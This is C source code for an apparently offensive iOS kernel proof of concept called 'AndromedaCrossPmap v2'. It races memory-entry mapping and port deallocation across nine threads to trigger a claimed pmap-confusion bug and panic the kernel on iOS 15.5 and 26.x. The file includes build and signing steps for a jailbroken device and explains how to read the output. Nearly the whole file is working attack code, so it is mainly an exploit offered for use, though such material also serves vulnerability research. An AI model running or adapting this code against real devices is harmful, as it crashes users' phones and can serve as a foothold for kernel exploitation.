/*
 * cross_pmap confusion trigger
 * AndromedaCrossPmap v2
 *
 * Bug: pmap_remove_options_internal removes PTEs from the wrong pmap when
 * a memory entry port is deallocated while cross-process mappings are still live.
 * iOS 15.5 panic: "attempt to remove mappings owned by pmap %p through pmap %p"
 * iOS 26.x panic: "pmap mismatch, ptdp=%p, pmap=%p, va=%p, level=%u"
 *
 * Natural panic observed on SE (April 2025) from securityd at pmap.c:5462.
 *
 * Technique:
 *   1. mach_make_memory_entry_64 — creates a named memory entry (Mach port)
 *   2. vm_map (or mach_vm_map) — maps the entry into this task's address space
 *   3. 9 threads race:
 *      - Mappers:    vm_map(entry_port) + vm_deallocate (repeated)
 *      - Deallocers: mach_port_deallocate(entry_port) while mappers hold mappings
 *      - Probers:    mach_make_memory_entry_64 on already-mapped region (race window)
 *   4. Race: dealloc of entry port while another pmap still has PTEs pointing to the
 *      underlying physical pages → kernel uses stale pmap pointer → assertion fires.
 *
 * All syscalls used are sandbox-accessible:
 *   mach_make_memory_entry_64  — Mach IPC trap (no entitlement)
 *   vm_map / vm_deallocate     — VM Mach traps
 *   mach_port_deallocate       — Mach IPC trap
 *   mach_port_allocate         — Mach IPC trap
 *
 * Usage:
 *   ./trigger --probe      Single-shot test (verify path works, less noisy)
 *   ./trigger --race       Aggressive 9-thread race (aim for kernel panic)
 *   ./trigger              Same as --race
 *
 * Compile on SE:
 *   clang-16 -isysroot /var/jb/usr/share/SDKs/iPhoneOS.sdk \
 *     -O2 -o trigger trigger.c
 *   ldid -S trigger
 *
 * Output interpretation:
 *   KERN_INVALID_ARGUMENT(4) / KERN_INVALID_RIGHT(7) on mach_make_memory_entry_64
 *     = port was already deallocated (race overlap = good, timing confirmed)
 *   KERN_NO_ACCESS(8) on vm_map after dealloc
 *     = entry port gone before mapping (we're in the window, tighten timing)
 *   kernel panic = proof of vulnerability
 *
 * IMPORTANT: --race will kernel panic the device. Run on SE only.
 * Capture IPS at /var/mobile/Library/Logs/CrashReporter/ after reboot.
 */

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <pthread.h>
#include <signal.h>
#include <time.h>
#include <mach/mach.h>
#include <mach/vm_map.h>
#include <mach/mach_vm.h>

/* ── Constants ── */
#define NUM_MAPPER_THREADS   3
#define NUM_DEALLOC_THREADS  3
#define NUM_PROBER_THREADS   3
#define TOTAL_THREADS        (NUM_MAPPER_THREADS + NUM_DEALLOC_THREADS + NUM_PROBER_THREADS)

#define RACE_DURATION_SECS   120    /* 2 minutes of racing — increase for longer run */
#define ALLOC_SIZE           (4 * 1024 * 1024)   /* 4MB entry — large enough to map */
#define MAX_PORTS            64     /* port ring buffer size */

/* ── Global shared state ── */
static volatile int     g_running       = 1;
static volatile uint64_t g_race_count   = 0;
static volatile uint64_t g_map_count    = 0;
static volatile uint64_t g_dealloc_count = 0;
static volatile uint64_t g_kr_errors    = 0;

/* Shared ring buffer of entry ports — mappers write, deallocers read+dealloc */
static mach_port_t      g_port_ring[MAX_PORTS];
static volatile int     g_port_valid[MAX_PORTS];   /* 1 = valid port, 0 = consumed */
static pthread_mutex_t  g_ring_lock = PTHREAD_MUTEX_INITIALIZER;

/* ── Timing helpers ── */

static uint64_t ns_now(void) {
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    return (uint64_t)ts.tv_sec * 1000000000ULL + (uint64_t)ts.tv_nsec;
}

static void log_kr(const char *op, kern_return_t kr) {
    if (kr != KERN_SUCCESS) {
        /* Count unique error codes for pattern analysis */
        __sync_fetch_and_add(&g_kr_errors, 1);
        /* Print only occasionally to avoid log flood during race */
        uint64_t cnt = __sync_fetch_and_add(&g_race_count, 1);
        if (cnt % 500 == 0) {
            printf("[KR] %s = %d (0x%x)  total_errors=%llu\n",
                   op, kr, (unsigned)kr, g_kr_errors);
            fflush(stdout);
        }
    }
}

/* ── PROBE: single-shot path verification ── */

static int probe_single_shot(void) {
    printf("[PROBE] single-shot cross-pmap path verification\n");

    kern_return_t kr;
    mach_port_t   entry_port = MACH_PORT_NULL;
    vm_address_t  map_addr   = 0;
    vm_size_t     map_size   = 0;

    /* Step 1: Allocate a region to back the memory entry */
    vm_address_t backing = 0;
    kr = vm_allocate(mach_task_self(), &backing, ALLOC_SIZE, VM_FLAGS_ANYWHERE);
    if (kr != KERN_SUCCESS) {
        printf("[PROBE] vm_allocate failed: %d\n", kr);
        return 1;
    }
    printf("[PROBE] backing region @ 0x%lx size=0x%x\n", (unsigned long)backing, ALLOC_SIZE);

    /* Touch pages to fault them in */
    memset((void *)backing, 0xAA, ALLOC_SIZE);

    /* Step 2: mach_make_memory_entry_64 — create named entry */
    mach_vm_size_t entry_size = ALLOC_SIZE;
    kr = mach_make_memory_entry_64(
        mach_task_self(),
        &entry_size,
        (mach_vm_offset_t)backing,
        VM_PROT_READ | VM_PROT_WRITE,
        &entry_port,
        MACH_PORT_NULL);

    if (kr != KERN_SUCCESS) {
        printf("[PROBE] mach_make_memory_entry_64 failed: %d\n", kr);
        vm_deallocate(mach_task_self(), backing, ALLOC_SIZE);
        return 1;
    }
    printf("[PROBE] memory entry port = 0x%x  entry_size=%llu\n",
           entry_port, (unsigned long long)entry_size);

    /* Step 3: vm_map the entry into our address space */
    kr = vm_map(mach_task_self(),
                &map_addr,
                (vm_size_t)entry_size,
                0,                          /* mask */
                VM_FLAGS_ANYWHERE,
                entry_port,
                0,                          /* offset */
                FALSE,                      /* copy */
                VM_PROT_READ | VM_PROT_WRITE,
                VM_PROT_READ | VM_PROT_WRITE,
                VM_INHERIT_NONE);

    if (kr != KERN_SUCCESS) {
        printf("[PROBE] vm_map failed: %d\n", kr);
        mach_port_deallocate(mach_task_self(), entry_port);
        vm_deallocate(mach_task_self(), backing, ALLOC_SIZE);
        return 1;
    }
    printf("[PROBE] mapped entry @ 0x%lx (size=0x%lx)\n",
           (unsigned long)map_addr, (unsigned long)entry_size);

    /* Step 4: Verify we can read through the mapping */
    volatile uint8_t *mapped = (volatile uint8_t *)map_addr;
    uint8_t val = *mapped;
    printf("[PROBE] read through mapping: 0x%02x (expected 0xAA)\n", val);
    if (val != 0xAA) {
        printf("[PROBE] WARN: unexpected read value — mapping may not be correct\n");
    }

    /* Step 5: Simulate the race trigger in probe mode (single-thread, no true race)
     * Sequence: deallocate the entry port WHILE the mapping is still live.
     * On a vulnerable kernel this can trigger "pmap mismatch" if the dealloc
     * triggers pmap_remove_options_internal before vm_deallocate unmap.
     * In probe mode it likely won't panic (we need concurrency), but we can
     * confirm whether the kernel accepts the operation or asserts early. */
    printf("[PROBE] deallocating entry port (mapping still live)...\n");
    uint64_t t0 = ns_now();

    kr = mach_port_deallocate(mach_task_self(), entry_port);
    uint64_t t1 = ns_now();
    printf("[PROBE] mach_port_deallocate kr=%d  elapsed=%llu ns\n", kr, t1 - t0);

    if (kr == KERN_SUCCESS) {
        printf("[PROBE] entry port deallocated while mapping at 0x%lx still live\n",
               (unsigned long)map_addr);
        printf("[PROBE] attempting read after dealloc (may panic on racy kernel)...\n");
        val = *mapped;  /* If pmap_remove fired on dealloc, this faults */
        printf("[PROBE] post-dealloc read: 0x%02x (no immediate crash)\n", val);
    }

    /* Step 6: Unmap */
    kr = vm_deallocate(mach_task_self(), map_addr, entry_size);
    printf("[PROBE] vm_deallocate mapping kr=%d\n", kr);
    kr = vm_deallocate(mach_task_self(), backing, ALLOC_SIZE);
    printf("[PROBE] vm_deallocate backing kr=%d\n", kr);

    printf("[PROBE] single-shot complete — no panic in sequential mode (expected)\n");
    printf("[PROBE] run with --race to trigger concurrent race condition\n");
    return 0;
}

/* ── RACE MODE threads ── */

/* Mapper threads: repeatedly create entry → map → record port → unmap */
static void *mapper_thread(void *arg) {
    int tid = (int)(intptr_t)arg;
    kern_return_t kr;

    /* Each mapper needs its own backing region */
    vm_address_t backing = 0;
    kr = vm_allocate(mach_task_self(), &backing, ALLOC_SIZE, VM_FLAGS_ANYWHERE);
    if (kr != KERN_SUCCESS) {
        printf("[MAPPER-%d] vm_allocate failed: %d\n", tid, kr);
        return NULL;
    }
    memset((void *)backing, 0xBB, ALLOC_SIZE);

    while (g_running) {
        /* Create memory entry */
        mach_port_t   port       = MACH_PORT_NULL;
        mach_vm_size_t esize     = ALLOC_SIZE;

        kr = mach_make_memory_entry_64(
            mach_task_self(), &esize,
            (mach_vm_offset_t)backing,
            VM_PROT_READ | VM_PROT_WRITE,
            &port, MACH_PORT_NULL);

        if (kr != KERN_SUCCESS) {
            log_kr("make_entry", kr);
            continue;
        }

        /* Map it */
        vm_address_t addr = 0;
        kr = vm_map(mach_task_self(), &addr, (vm_size_t)esize,
                    0, VM_FLAGS_ANYWHERE, port, 0, FALSE,
                    VM_PROT_READ | VM_PROT_WRITE,
                    VM_PROT_READ | VM_PROT_WRITE,
                    VM_INHERIT_NONE);

        if (kr == KERN_SUCCESS) {
            __sync_fetch_and_add(&g_map_count, 1);

            /* Publish the port to the dealloc threads WHILE mapping is live.
             * This is the race: dealloc thread may call mach_port_deallocate
             * before we call vm_deallocate on addr — leaving the PTE orphaned. */
            int slot = (int)(g_map_count % MAX_PORTS);
            pthread_mutex_lock(&g_ring_lock);
            if (!g_port_valid[slot]) {
                g_port_ring[slot] = port;
                g_port_valid[slot] = 1;
            } else {
                /* Slot occupied — dealloc the port ourselves */
                mach_port_deallocate(mach_task_self(), port);
            }
            pthread_mutex_unlock(&g_ring_lock);

            /* Touch mapped memory — if pmap_remove already fired, this panics */
            volatile uint8_t *p = (volatile uint8_t *)addr;
            (void)*p;

            /* Unmap — if dealloc thread beat us, the pmap for addr may already
             * be wrong, triggering "pmap mismatch" in pmap_remove_options_internal */
            kr = vm_deallocate(mach_task_self(), addr, esize);
            log_kr("vm_deallocate(map)", kr);

        } else {
            log_kr("vm_map", kr);
            mach_port_deallocate(mach_task_self(), port);
        }
    }

    vm_deallocate(mach_task_self(), backing, ALLOC_SIZE);
    return NULL;
}

/* Dealloc threads: consume ports from ring buffer and deallocate them */
static void *dealloc_thread(void *arg) {
    int tid = (int)(intptr_t)arg;
    int slot = tid;  /* each dealloc thread starts at a different slot */

    while (g_running) {
        /* Spin through ring buffer looking for a port to consume */
        for (int i = 0; i < MAX_PORTS && g_running; i++) {
            slot = (slot + 1) % MAX_PORTS;

            pthread_mutex_lock(&g_ring_lock);
            if (g_port_valid[slot]) {
                mach_port_t port = g_port_ring[slot];
                g_port_ring[slot]  = MACH_PORT_NULL;
                g_port_valid[slot] = 0;
                pthread_mutex_unlock(&g_ring_lock);

                /* THE RACE: deallocate the entry port.
                 * If a mapper thread still has a mapping backed by this port,
                 * the subsequent vm_deallocate in the mapper will attempt
                 * pmap_remove_options_internal with a mismatched pmap. */
                kern_return_t kr = mach_port_deallocate(mach_task_self(), port);
                log_kr("mach_port_deallocate(race)", kr);
                __sync_fetch_and_add(&g_dealloc_count, 1);
            } else {
                pthread_mutex_unlock(&g_ring_lock);
            }
        }
        /* Yield to let mapper threads fill the ring */
        sched_yield();
    }
    return NULL;
}

/* Prober threads: call mach_make_memory_entry_64 on already-mapped regions,
 * opening a second entry pointing to the same pages. This creates the
 * cross-pmap confusion condition — two pmaps own PTEs for the same physical
 * pages, and the first dealloc may fire pmap_remove on the wrong one. */
static void *prober_thread(void *arg) {
    int tid = (int)(intptr_t)arg;
    kern_return_t kr;

    /* Allocate a small region for probing */
    vm_address_t probe_region = 0;
    kr = vm_allocate(mach_task_self(), &probe_region, 4096, VM_FLAGS_ANYWHERE);
    if (kr != KERN_SUCCESS) {
        printf("[PROBER-%d] vm_allocate failed: %d\n", tid, kr);
        return NULL;
    }
    *(volatile uint8_t *)probe_region = 0xCC;

    while (g_running) {
        /* Make an entry from the probe region */
        mach_port_t   p1    = MACH_PORT_NULL;
        mach_vm_size_t sz   = 4096;

        kr = mach_make_memory_entry_64(
            mach_task_self(), &sz,
            (mach_vm_offset_t)probe_region,
            VM_PROT_READ | VM_PROT_WRITE,
            &p1, MACH_PORT_NULL);

        if (kr != KERN_SUCCESS) {
            log_kr("prober/make_entry", kr);
            continue;
        }

        /* Map it — now probe_region has TWO mappings via different entry ports */
        vm_address_t extra_map = 0;
        kr = vm_map(mach_task_self(), &extra_map, 4096,
                    0, VM_FLAGS_ANYWHERE, p1, 0, FALSE,
                    VM_PROT_READ | VM_PROT_WRITE,
                    VM_PROT_READ | VM_PROT_WRITE,
                    VM_INHERIT_NONE);

        if (kr == KERN_SUCCESS) {
            __sync_fetch_and_add(&g_race_count, 1);

            /* Rapidly dealloc the port (may trigger pmap_remove from wrong pmap) */
            mach_port_deallocate(mach_task_self(), p1);

            /* Then unmap — kernel must now reconcile two pmaps for same pages */
            vm_deallocate(mach_task_self(), extra_map, 4096);
        } else {
            mach_port_deallocate(mach_task_self(), p1);
        }
    }

    vm_deallocate(mach_task_self(), probe_region, 4096);
    return NULL;
}

/* ── Status thread: prints progress every 5s ── */
static void *status_thread(void *arg) {
    (void)arg;
    uint64_t start = ns_now();

    while (g_running) {
        sleep(5);
        uint64_t elapsed = (ns_now() - start) / 1000000000ULL;
        printf("[STATUS] t=%llus  maps=%llu  deallocs=%llu  race_ops=%llu  errors=%llu\n",
               elapsed, g_map_count, g_dealloc_count, g_race_count, g_kr_errors);
        fflush(stdout);
    }
    return NULL;
}

/* ── Race driver ── */

static int run_race(void) {
    printf("[RACE] AndromedaCrossPmap v2 — 9-thread race\n");
    printf("[RACE] Threads: %d mappers + %d deallocers + %d probers\n",
           NUM_MAPPER_THREADS, NUM_DEALLOC_THREADS, NUM_PROBER_THREADS);
    printf("[RACE] Duration: %d seconds\n", RACE_DURATION_SECS);
    printf("[RACE] SUCCESS = kernel panic (pmap mismatch assertion)\n\n");
    fflush(stdout);

    memset((void *)g_port_ring,  0, sizeof(g_port_ring));
    memset((void *)g_port_valid, 0, sizeof(g_port_valid));

    pthread_t threads[TOTAL_THREADS + 1];
    int idx = 0;

    /* Status thread */
    pthread_create(&threads[idx++], NULL, status_thread, NULL);

    /* Mapper threads */
    for (int i = 0; i < NUM_MAPPER_THREADS; i++)
        pthread_create(&threads[idx++], NULL, mapper_thread, (void *)(intptr_t)i);

    /* Dealloc threads */
    for (int i = 0; i < NUM_DEALLOC_THREADS; i++)
        pthread_create(&threads[idx++], NULL, dealloc_thread, (void *)(intptr_t)i);

    /* Prober threads */
    for (int i = 0; i < NUM_PROBER_THREADS; i++)
        pthread_create(&threads[idx++], NULL, prober_thread, (void *)(intptr_t)i);

    /* Run for configured duration */
    sleep(RACE_DURATION_SECS);
    g_running = 0;

    /* Join all threads */
    for (int i = 0; i < idx; i++)
        pthread_join(threads[i], NULL);

    printf("\n[RACE] completed without panic\n");
    printf("[RACE] total maps=%llu  deallocs=%llu  race_ops=%llu  errors=%llu\n",
           g_map_count, g_dealloc_count, g_race_count, g_kr_errors);
    printf("[RACE] NOTE: no panic = race window too narrow or timing mismatch.\n");
    printf("[RACE]   Increase RACE_DURATION_SECS or reduce ALLOC_SIZE for tighter window.\n");
    fflush(stdout);
    return 0;
}

/* ── main ── */

int main(int argc, char *argv[]) {
    int probe_mode = 0;

    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "--probe") == 0) probe_mode = 1;
        else if (strcmp(argv[i], "--race") == 0)  probe_mode = 0;
    }

    printf("AndromedaCrossPmap v2 — cross-pmap confusion trigger\n");
    printf("Bug: pmap_remove_options_internal removes PTEs from wrong pmap\n");
    printf("Target: iOS 15.5 (SE) primary, iOS 26.x secondary\n");
    printf("Mode: %s\n\n", probe_mode ? "PROBE (single-shot)" : "RACE (9 threads)");
    fflush(stdout);

    if (probe_mode) {
        return probe_single_shot();
    } else {
        return run_race();
    }
}
